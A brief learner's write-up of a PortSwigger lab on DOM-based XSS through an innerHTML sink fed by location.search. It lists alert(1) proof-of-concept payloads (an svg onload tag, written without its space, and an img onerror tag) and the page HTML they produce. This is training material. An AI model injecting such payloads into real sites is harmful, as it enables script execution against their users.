# **DOM XSS in `innerHTML` sink using source `location.search`**

This was confusing because I didn’t understand at first that it was filtering the script tag, I used one of the 1 liner tags in PayloadAllTheThings

```
<svgonload=alert(1)>
```

The solution from Portswigger recomends

```
<img src=1 onerror=alert(1)>
```

But I wanted to understand further.

The HTML code on the page:

```
<h1>
    0 search results for '
    
        <svg onload="alert(1)"></svg>
    
    '
</h1>
```
